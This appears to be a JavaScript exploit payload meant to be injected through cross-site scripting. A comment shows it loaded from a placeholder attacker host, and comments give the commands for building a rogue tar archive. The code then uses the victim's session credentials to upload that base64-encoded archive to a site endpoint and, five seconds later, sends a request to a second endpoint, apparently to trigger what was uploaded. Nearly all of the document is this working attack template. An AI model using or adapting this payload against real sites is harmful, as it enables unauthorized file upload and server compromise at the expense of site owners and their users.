//Script execution: <script src='http://attacker-ip:attacker_port/tgz_upload.js'></script>

// Generate a tgz file: tar -cvzf rogue.tgz CompressThisFolder (This folder needs to be compressed)
// Base64 encode the tgz file: cat rogue.tgz | base64 -w 0 > payload
var payload = "base64_encoded_tgz_file";

var protocol = "http://";
var target = document.location.host;

function uploadFile(){


    var boundary = "---------------------------158413537371804998625757613";

    var path = "/file.php/path/subpath/endpoint";

    xhr = new XMLHttpRequest();
	xhr.open("POST", protocol + target + path, true);
	xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=' + boundary);
    xhr.withCredentials = "true";

    var body = "";
    body += "--" + boundary + "\r\n";
    
    body += 'Content-Disposition: form-data; name="sampleParameter"; filename="rogue.tgz"\r\n';
    body += 'Content-Type: application/x-compressed-tar\r\n\r\n';
    body += atob(payload) + '\r\n';
    body += "--" + boundary + "--";

    var requestBody = new Uint8Array(body.length);
    for (var i=0; i<body.length; i++){
        requestBody[i] = body.charCodeAt(i);
    }

    xhr.send(new Blob([requestBody]));

}

function send_get_request(){

    var path = '/test.php/path/subpath/endpoint';
    
    xhr = new XMLHttpRequest();
	xhr.open("GET", protocol + target + path, true);
	xhr.send(null);

}


uploadFile();
setTimeout(send_get_request, 5000); // Send the request after 5 sec
